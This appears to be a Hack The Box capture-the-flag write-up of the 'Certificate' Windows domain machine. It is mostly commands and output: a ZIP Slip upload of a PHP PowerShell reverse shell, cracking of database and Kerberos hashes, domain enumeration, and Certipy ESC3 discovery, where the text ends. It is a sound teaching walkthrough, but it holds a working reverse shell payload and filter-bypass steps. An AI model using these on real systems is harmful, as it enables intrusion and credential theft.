<p class="indent-paragraph">  
This write-up details the full compromise of the <code>Certificate</code> machine on Hack The Box. The attack path begins with enumeration of web and domain services, leading to the discovery of a file upload vulnerability within a student/teacher portal. By chaining a ZIP Slip exploit with a crafted PHP reverse shell, initial access is achieved as <code>xamppuser</code><span class="codefix">.</span> From there, database credentials are extracted, bcrypt hashes are cracked, and LDAP permissions are mapped to identify a user capable of performing a ForceChangePassword attack. After pivoting through multiple accounts via Evil-WinRM and enumerating user privileges, SeManageVolumePrivilege is exploited to extract the CA's private key. Ultimately, a forged certificate is used with Certipy to impersonate the domain administrator and retrieve the final flag—demonstrating a complete end-to-end compromise through ADCS abuse and credential forgery.
</p>

<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://labs.hackthebox.com/achievement/machine/1007551/663" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">Certificate Badge</a>
</div><br>

---

### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
An initial <code>full-TCP SYN</code> scan across all 65 535 ports (host discovery disabled, timing template T4) revealed that the target is online and running a variety of Windows services typical of a domain environment. The open ports include <code>DNS</code> (53), <code>HTTP</code> (80), <code>Kerberos</code> (88/464), <code>MS-RPC</code> (135), <code>NetBIOS/SMB</code> (139/445), <code>LDAP</code> (389/636), <code>RPC over HTTP</code> (593), <code>WS-Management</code> (5985), <code>Global Catalog</code> (3268/3269), and <code>AD Web Services</code> (9389).
</p>

```
~$ nmap -sS -Pn -T4 -p- <IP>
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-18 17:53 -03
Nmap scan report for <IP>
Host is up (0.14s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-19 05:01:00Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:02:33+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:02:34+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:02:33+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-19T05:02:34+00:00; +8h00m01s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49718/tcp open  msrpc         Microsoft Windows RPC
49753/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-19T05:01:52
|_  start_date: N/A
|_clock-skew: mean: 8h00m00s, deviation: 0s, median: 8h00m00s
```

<p class="indent-paragraph">
After identifying Kerberos and LDAP services during the initial scan, local name resolution was configured to support proper domain-based authentication. A new entry was added to the <code>/etc/hosts</code> file, mapping the target IP address to both <code>certificate.htb</code> and <code>DC01.certificate.htb</code><span class="codefix">.</span>
</p>

```
~$ nano /etc/hosts

<IP> certificate.htb DC01.certificate.htb
```

### 📌 Web Enumeration and Initial Foothold

<p class="indent-paragraph">
Navigating to the web service hosted on port 80 reveals a brightly themed educational portal branded as "Certificate". The landing page introduces the platform as a place to learn new skills and get certified, hinting at user roles such as students and teachers. While no obvious entry points are exposed initially, the site presents multiple navigation options—such as account creation, login, and content access—suggesting dynamic functionality behind the frontend. 
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/recon-website-1.png" alt="Web Enumeration" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
After creating a student user and successfully logging into the platform, we began navigating through its main functionalities. Exploring the "Courses" section of the platform reveals that course details are publicly accessible through parameterized URLs such as <code>course-details.php?id=2</code><span class="codefix">.</span> Each course page displays structured information including the trainer's name, course fee, estimated duration, and a detailed objective section.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/recon-website-2.png" alt="Web Enumeration" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
Upon enrolling in a course via the "Enroll the Course" button, the interface expands to reveal a detailed course outline with multiple sessions and quizzes. Each session includes a "Watch" button, while the final session provides a "Submit" option. Hovering over the submit button reveals a direct link to <code>upload.php</code> with a dynamic <code>s_id</code> parameter, such as <code>s_id=19</code><span class="codefix">.</span> This suggests that users are allowed to upload some form of content, possibly as an assignment submission.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/recon-website-3.png" alt="Web Enumeration" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
The upload interface explicitly allows only specific file types, such as <code>.pdf</code><span class="codefix">,</span> <code>.docx</code><span class="codefix">,</span> <code>.pptx</code> and <code>.xlsx</code><span class="codefix">,</span> but also permits submissions inside a <code>.zip</code> archive for size reduction. This opens the door to potential exploitation via the well-known <a href="https://github.com/snyk/zip-slip-vulnerability" target="_blank">Zip Slip</a> vulnerability. Zip Slip abuses path traversal inside archive entries (e.g., <code>../../shell.php</code>) to overwrite arbitrary files on the server upon extraction—often leading to remote command execution. Since many backend implementations fail to validate extraction paths properly, this vector is a critical area to test.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/recon-website-4.png" alt="Web Enumeration" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
To execute commands on the remote system, we first crafted a malicious PHP payload designed to spawn a reverse PowerShell session. This payload leverages the <code>System.Net.Sockets.TCPClient</code> class to establish a backconnect to our listener, enabling interactive command execution. More details about this technique can be found in <a href="https://int0x33.medium.com/from-php-s-hell-to-powershell-heaven-da40ce840da8" target="_blank">"From PHP (s)HELL to Powershell Heaven"</a>, which inspired the structure and behavior of our payload.
</p>

```
~$ nano shell.php

<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('IP',1234); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>

```

<p class="indent-paragraph">
To prepare a more convincing ZIP archive, we generated a harmless-looking dummy file using a simple <code>touch</code> command. This file simulates a legitimate document (e.g., <code>file.pdf</code>), helping the final archive bypass superficial upload filters that might reject standalone executable or PHP content.
</p>

```
~$ touch file.pdf

```

<p class="indent-paragraph">
Finally, both the dummy PDF and the malicious PHP shell were packaged into separate ZIP archives and concatenated into a single file. This technique is commonly used to obfuscate the payload and trick upload parsers that only inspect the first or last archive entry, increasing the likelihood of successful execution on the target.
</p>

```
~$ zip file.zip file.pdf                                           
  adding: file.pdf (stored 0%)
                                                                                               
~$ zip shell.zip shell.php                                                  
  adding: shell.php (deflated 40%)
                                                                                               
~$ cat file.zip shell.zip > revshell.zip 
```

<p class="indent-paragraph">
With the payload archive crafted, we proceeded to upload the file through the platform’s assignment submission form. After submitting the ZIP file, the server responded with a confirmation message and a direct link to the uploaded file under a predictable path, such as <code>/static/uploads/&lt;uuid&gt;/file.pdf</code><span class="codefix">.</span> This behavior is crucial, as it confirms the file was stored in a web-accessible directory, enabling direct access to the injected payload when requested via the browser.
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/recon-website-5.png" alt="Web Enumeration" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
To catch the reverse shell connection, we started a listener on port 1234 using <code>rlwrap</code> in conjunction with Netcat for improved terminal interaction. Once the uploaded payload was accessed, a successful connection was established from the target host, spawning a PowerShell session with the privileges of the <code>xamppuser</code><span class="codefix">.</span> This confirms code execution and marks the initial foothold into the system.
</p>

```
~$ rlwrap nc -lvnp 1234                                                            
listening on [any] 1234 ...
connect to [IP] from (UNKNOWN) [IP] 63003

PS C:\xampp\htdocs\certificate.htb\static\uploads\uuid> whoami
certificate\xamppuser
 
```

<p class="indent-paragraph">
Once inside the target machine, we began inspecting the web root directory, where several relevant PHP files were located. Among them, the <code>db.php</code> file contained hardcoded database credentials, revealing the database name, username, and a valid password. This provided an opportunity to pivot into the underlying MySQL service for further enumeration or data extraction.
</p>

```
~$ PS C:\xampp\htdocs\certificate.htb> dir


    Directory: C:\xampp\htdocs\certificate.htb


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/26/2024   1:49 AM                static                                                                
-a----       12/24/2024  12:45 AM           7179 about.php                                                             
-a----       12/30/2024   1:50 PM          17197 blog.php                                                              
-a----       12/30/2024   2:02 PM           6560 contacts.php                                                          
-a----       12/24/2024   6:10 AM          15381 course-details.php                                                    
-a----       12/24/2024  12:53 AM           4632 courses.php                                                           
-a----       12/23/2024   4:46 AM            549 db.php                                                                
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php                                                    
-a----       12/22/2024  10:22 AM           1331 feature-area.php                                                      
-a----       12/22/2024  10:16 AM           2955 footer.php                                                            
-a----       12/23/2024   5:13 AM           2351 header.php                                                            
-a----       12/24/2024  12:52 AM           9497 index.php                                                             
-a----       12/25/2024   1:34 PM           5908 login.php                                                             
-a----       12/23/2024   5:14 AM            153 logout.php                                                            
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php                                              
-a----       12/25/2024   1:27 PM           8240 register.php                                                          
-a----       12/28/2024  11:26 PM          10366 upload.php                                                            


~$ PS C:\xampp\htdocs\certificate.htb> type db.php

<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

<p class="indent-paragraph">
With an active reverse shell, we leveraged our knowledge of the XAMPP directory structure to interact directly with the MySQL service. By executing the MySQL binary located at <code>C:\xampp\mysql\bin\mysql.exe</code><span class="codefix">,</span> we successfully authenticated using the extracted credentials and listed the available databases. This confirmed access to <code>certificate_webapp_db</code><span class="codefix">.</span>
</p>

```
~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "SHOW DATABASES;"

Database
certificate_webapp_db
information_schema
test
```

<p class="indent-paragraph">
Continuing the enumeration, we queried the <code>certificate_webapp_db</code> and identified four tables of interest, particularly <code>users</code><span class="codefix">,</span> which revealed a list of registered accounts along with their bcrypt-hashed passwords. Among the entries, we found <code>sara.b</code><span class="codefix">,</span> the only user assigned the <code>admin</code> role, indicating her elevated privileges within the application. This discovery highlights a valuable authentication target for lateral movement or privilege escalation.
</p>

```
~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "SHOW TABLES;" certificate_webapp_db

Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses

~$ PS C:\xampp\htdocs\certificate.htb> & "C:\xampp\mysql\bin\mysql.exe" -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;"  -E

<skip>
*************************** 6. row ***************************
        id: 10
first_name: Sara
 last_name: Brawn
  username: sara.b
     email: sara.b@certificate.htb
  password: $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
created_at: 2024-12-25 21:31:26
      role: admin
 is_active: 1
```

<p class="indent-paragraph">
To accurately determine the format of the extracted hash, we used the <code>hashcat --identify</code> command with the contents of the file containing <code>sara.b's</code> password hash. The output revealed a match with the <code>bcrypt $2*$</code> format (mode <code>3200</code>), which is commonly employed in Unix-like systems and modern web applications.
</p>

```
~$ hashcat --identify hash-sara-b.txt 
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

<p class="indent-paragraph">
John the Ripper tool was executed against the extracted password hash using the popular <code>rockyou.txt</code> wordlist. Within seconds, the password for the admin account <code>sara.b</code> was successfully recovered as <code>Blink182</code><span class="codefix">.</span>
</p>

```
~$ john --wordlist=/usr/share/wordlists/rockyou.txt hash-sara-b.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
~$ Blink182         (?)     
1g 0:00:00:01 DONE 0.7299g/s 8934p/s 8934c/s 8934C/s auntie..vallejo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### 🧠 Enumerating SMB with Valid Credentials

<p class="indent-paragraph">
With the administrator credentials retrieved from the web application's database, we transitioned to internal enumeration. Using the username <code>sara.b</code> and the recovered password <code>Blink182</code><span class="codefix">,</span> we performed SMB authentication against the domain controller. The credentials were successfully validated, confirming that the compromised user is part of the internal domain <code>certificate.htb</code><span class="codefix">.</span>
</p>

```
~$ nxc smb dc.01certificate.htb -u sara.b -p 'Blink182'                                                 
SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
SMB         <IP>     445    DC01             [+] certificate.htb\sara.b:Blink182 
```

<p class="indent-paragraph">
With valid domain credentials for <code>sara.b</code><span class="codefix">,</span> we proceeded to enumerate available SMB shares on the <code>DC01</code> host using <code>nxc</code><span class="codefix">.</span> The account successfully authenticated and revealed accessible shares such as <code>NETLOGON</code><span class="codefix">,</span> <code>SYSVOL</code><span class="codefix">,</span> and <code>IPC$</code><span class="codefix">,</span> all with read permissions. Although no writeable shares were identified at this stage, this level of access is often sufficient to proceed with further enumeration or identify exploitable misconfigurations in Active Directory environments.
</p>

```
~$ nxc smb dc01.certificate.htb -u sara.b -p 'Blink182' --shares
SMB         <IP>     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False) 
SMB         <IP>     445    DC01             [+] certificate.htb\sara.b:Blink182 
SMB         <IP>     445    DC01             [*] Enumerated shares
SMB         <IP>     445    DC01             Share           Permissions     Remark
SMB         <IP>     445    DC01             -----           -----------     ------
SMB         <IP>     445    DC01             ADMIN$                          Remote Admin
SMB         <IP>     445    DC01             C$                              Default share
SMB         <IP>     445    DC01             IPC$            READ            Remote IPC
SMB         <IP>     445    DC01             NETLOGON        READ            Logon server share 
SMB         <IP>     445    DC01             SYSVOL          READ            Logon server share
```

<p class="indent-paragraph">
Using the <code>nxc</code> tool with the <code>--rid-brute</code> flag against the <code>DC01</code> host, we were able to extract a full list of domain SIDs and filter them by user type.
</p>

```
~$ nxc smb certificate.htb -u sara.b -p 'Blink182' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}'

Administrator
Guest
krbtgt
DC01$
WS-01$
Kai.X
Sara.B
John.C
Aya.W
Nya.S
Maya.K
Lion.SK
Eva.F
Ryan.K
akeder.kh
kara.m
Alex.D
karol.s
saad.m
xamppuser
WS-05$
```

### 🔍 Enumerating AD Group Memberships from a Low-Privileged User

<p class="indent-paragraph">
Next, the <code>/etc/krb5.conf</code> file was updated to define <code>certificate.HTB</code> as the default realm. The configuration disabled automatic DNS lookups and explicitly pointed both the KDC and admin server fields to the target IP. This setup is critical for interacting with Kerberos-based environments and enables tools such as <code>Impacket</code><span class="codefix">,</span> <code>BloodHound</code><span class="codefix">,</span> and <code>Certipy</code> to function correctly.
</p>

```
~$ nano /etc/krb5.conf

[libdefaults]
    default_realm = certificate.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true
    renewable = true

[realms]
    certificate.HTB = {
        kdc = <IP>
        admin_server = <IP>
    }

[domain_realm]
    .certificate.htb = certificate.HTB
    certificate.htb = certificate.HTB
```

<p class="indent-paragraph">
For successful Kerberos authentication and to avoid clock skew issues during enumeration, the attacker system's local time must be closely synchronized with the Domain Controller. This was achieved using a custom Bash script that leverages <code>ntpdate</code> to align the machine’s time with the DC. Proper time sync ensures seamless interaction with Kerberos-based services and prevents authentication failures during tools execution like <code>BloodHound</code><span class="codefix">.</span>
</p>

```
~$ nano sync_time_from_dc.sh

#!/bin/bash

# Prompt for the IP address of the Domain Controller
read -p "[?] Enter the IP address of the Domain Controller: " DC_IP

# Validate input
if [[ -z "$DC_IP" ]]; then
  echo "[-] No IP address provided. Exiting."
  exit 1
fi

echo "[*] Synchronizing local time with Domain Controller ($DC_IP)..."

# Execute ntpdate with root privileges to sync clock
if sudo ntpdate "$DC_IP"; then
  echo "[+] Local system time successfully synchronized with DC ($DC_IP)."
else
  echo "[-] Failed to synchronize time. Check connectivity or sudo permissions."
  exit 1
fi

~$ ./sync_time_from_dc.sh

[?] Enter the IP address of the Domain Controller: <IP>
[*] Synchronizing local time with Domain Controller (<IP>)...
2025-07-22 02:24:35.875681 (-0300) +28800.974398 +/- 0.066239 <IP> s1 no-leap
CLOCK: time stepped by 28800.974398
[+] Local system time successfully synchronized with DC (<IP>).
```


<p class="indent-paragraph">
With proper domain configuration in place, the BloodHound data collection process was initiated using the <code>bloodhound-python</code> collector directly from the attacker’s machine. The user <code>sara.b</code> was authenticated via NTLM after a Kerberos TGT failure caused by clock skew. Despite this fallback, enumeration proceeded successfully, identifying 1 domain, 3 computers, 19 users, 58 groups, and other relevant Active Directory objects within seconds. This dataset was later used for relationship mapping and privilege escalation path discovery within the BloodHound interface.
</p>

```
~$ bloodhound-python -u 'sara.b' -p 'Blink182' -d certificate.htb -dc dc01.certificate.htb -c All -ns <IP>

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
INFO: Done in 00M 24S
```

<p class="indent-paragraph">
Once the data was ingested into the BloodHound interface, an initial relationship query was run against the compromised user <code>SARA.B@CERTIFICATE.HTB</code><span class="codefix">.</span> The graph revealed that this account is part of common groups like <code>Domain Users</code> and <code>Users</code><span class="codefix">,</span> but also belongs to strategic groups such as <code>HELP DESK</code><span class="codefix">,</span> <code>REMOTE DESKTOP USERS</code><span class="codefix">,</span> and <code>REMOTE MANAGEMENT USERS</code><span class="codefix">.</span>
</p>

<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/bloodhound-1.png" alt="BloodHound" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

### ⬆️ Validating Remote Shell Access through WinRM

<p class="indent-paragraph">
To validate practical access rights and pivot capabilities, the <code>nxc winrm</code> module was used to test remote connectivity via Windows Remote Management (WinRM). The result confirmed that the compromised user <code>SARA.B@CERTIFICATE.HTB</code> was able to successfully authenticate and establish a remote PowerShell session with the target system. The successful connection, indicated by the <code>Pwn3d!</code> tag, demonstrates that WinRM is enabled and accessible, allowing post-exploitation tools such as <code>evil-winrm</code> to be leveraged for further enumeration and lateral movement within the domain.
</p>

```
~$ nxc winrm certificate.htb -u sara.b -p Blink182 -d certificate.htb

WINRM       <IP>     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       <IP>     5985   DC01             [+] certificate.htb\sara.b:Blink182 (Pwn3d!)
```

<p class="indent-paragraph">
With WinRM access confirmed, a full remote PowerShell session was initiated using <code>evil-winrm</code><span class="codefix">.</span> Upon successful authentication, the session landed directly on the user context of <code>certificate\sara.b</code><span class="codefix">.</span>
</p>

```
~$ evil-winrm -i certificate.htb -u sara.b -p Blink182                               
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami
certificate\sara.b
```

<p class="indent-paragraph">
Navigating through the user's document folder, a subdirectory named <code>WS-01</code> revealed two files of interest: <code>Description.txt</code> and <code>WS-01_PktMon.pcap</code><span class="codefix">.</span> The text file described anomalous behavior related to a shared folder named <code>Reports</code> hosted on <code>DC01</code><span class="codefix">.</span> Specifically, it indicated that invalid credentials would return a typical error, while valid credentials caused the file explorer to freeze and crash<span class="codefix">.</span> This description suggests a deeper issue potentially tied to authentication handling or resource permissions, making the accompanying <code>.pcap</code> file a valuable asset for further network traffic analysis.
</p>

```
~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> dir


    Directory: C:\Users\Sara.B\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        11/4/2024  12:53 AM                WS-01


~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents> cd WS-01
~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap


~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> type Description.txt
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!

~$ *Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
                                        
Info: Downloading C:\Users\Sara.B\Documents\WS-01\WS-01_PktMon.pcap to WS-01_PktMon.pcap
                                        
Info: Download successful!
```

### 🧩 Offline Attack Surface Identified via PCAP Inspection

<p class="indent-paragraph">
An initial traffic inspection was performed using <code>tshark</code> to identify Kerberos authentication attempts. The goal was to isolate AS-REQ messages (Kerberos message type 10) that used the encryption type <code>AES256-CTS-HMAC-SHA1-96</code> (etype 18), which is commonly used for strong encryption in Active Directory environments. The following command was used to extract the frame number, source IP address, username (CNameString), Kerberos realm, etype, and the cipher value from the capture file:
</p>

```
~$ tshark -r WS-01_PktMon.pcap -Y "kerberos.msg_type == 10 and kerberos.etype == 18" -T fields -e frame.number -e ip.src -e kerberos.CNameString -e kerberos.realm -e kerberos.etype -e kerberos.cipher 

917	192.168.56.128	Lion.SK	CERTIFICATE	18 23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0 
```

<p class="indent-paragraph">
This filtered output revealed a frame where the user <code>Lion.SK</code> from realm <code>CERTIFICATE</code> sent an AS-REQ using etype 18, along with a full Kerberos cipher string. This information can be critical for password brute-force or offline cracking scenarios if the encryption key can be targeted.
</p>
<p class="indent-paragraph">
To further validate and visualize the structure of the packet, the corresponding frame (frame 917) was opened in Wireshark. As shown in the screenshot below, the cipher value is embedded within the <code>PA-DATA</code> structure of the Kerberos request. Identifying this specific field within the raw bytes confirms the integrity and position of the extracted hash.
</p>


<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/certificate/WiresharkKerberosAS-REQFrame917.png" alt="Wireshark Kerberos AS-REQ Frame 917" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

<p class="indent-paragraph">
Following the network traffic analysis, an AS-REQ message from the user <code>Lion.SK</code> was identified using <code>tshark</code><span class="codefix">,</span> with the encryption type <code>etype 18</code> (AES256-CTS-HMAC-SHA1-96) and containing a cipher blob indicative of pre-authentication data exposure. This condition made the user a viable target for an <strong>AS-REP Roasting</strong> attack, which exploits the absence of enforced pre-authentication on Kerberos accounts. The extracted hash was formatted for cracking and successfully processed using <code>hashcat</code> with mode <code>19900</code><span class="codefix">,</span> revealing the user’s plaintext password as <code>!QAZ2wsx</code><span class="codefix">.</span>
</p>

```
~$ nano hash-lion.txt

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$<cipher>

~$ hashcat -m 19900 -a 0 hash-lion.txt /usr/share/wordlists/rockyou.txt       
hashcat (v6.2.6) starting

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx
```

<p class="indent-paragraph">
With the password <code>!QAZ2wsx</code> obtained from a successful AS-REP Roasting attack, access to the target machine was established via <code>evil-winrm</code> using the credentials <code>Lion.SK</code><span class="codefix">.</span> Upon authentication, the session opened a remote PowerShell shell, confirming valid user access. Navigating through the user's profile, the <code>user.txt</code> file was located on the Desktop directory and successfully retrieved, revealing the first flag.
</p>

```
~$ evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7
                                        
Info: Establishing connection to remote endpoint
~$ *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> dir


    Directory: C:\Users\Lion.SK\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        7/24/2025   9:00 AM             34 user.txt

~$ *Evil-WinRM* PS C:\Users\Lion.SK\Desktop> cat *
*********************************
```

### 🔑 Enumerating Certificate Paths

<p class="indent-paragraph">
An enumeration with <code>certipy-ad</code> targeting certificate templates revealed that the environment is vulnerable to the ESC3 attack path. The analysis identified the <code>Delegated-CRA</code> template as enabled and configured with the <code>Certificate Request Agent</code> EKU, which allows its enrollment by members of the <code>Domain CRA Managers</code> group<span class="codefix">.</span> This configuration permits delegated certificate requests on behalf of other users without requiring additional approvals, which can be exploited to impersonate privileged users within the domain.
</p>

```
~$ certipy-ad find -u Lion.SK -p '!QAZ2wsx' -dc-ip <IP> -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
